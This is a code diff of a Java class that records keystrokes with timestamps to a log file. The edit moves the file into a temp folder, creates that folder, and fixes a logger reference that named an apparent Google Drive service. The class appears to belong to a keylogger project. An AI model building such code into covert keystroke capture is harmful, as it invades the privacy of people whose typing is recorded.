@@ -10,9 +10,10 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class KeyboardLogService {
-    private static final String FILE_PATH = "keyboard_logs.txt";
+    private static String FILE_PATH;
     
     public KeyboardLogService() {
+        FILE_PATH = DiretoryService.getParentApplicationPath() + "\\temp\\keyboard_logs.txt";
         this.writeHeader();
     }
     
@@ -23,8 +24,14 @@ public class KeyboardLogService {
     
     private void writeHeader() {
         File keyboardLogFile = new File(FILE_PATH);
-        
+        System.out.println(FILE_PATH);
         if (!keyboardLogFile.exists()) {
+            File parentFolder = keyboardLogFile.getParentFile();
+            
+            if (!parentFolder.exists()) {
+                parentFolder.mkdirs();
+            }
+            
             this.writeInFile("Data e Hora             Tecla Pressionada");
             this.writeInFile("-------------------     -------------------");
         }
@@ -34,7 +41,7 @@ public class KeyboardLogService {
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(FILE_PATH, true))) {
             writer.write(textLine + "\n");
         } catch (IOException ex) {
-            Logger.getLogger(GoogleDriveService.class.getName()).log(Level.SEVERE, null, ex);
+            Logger.getLogger(KeyboardLogService.class.getName()).log(Level.SEVERE, null, ex);
         }
     }
     
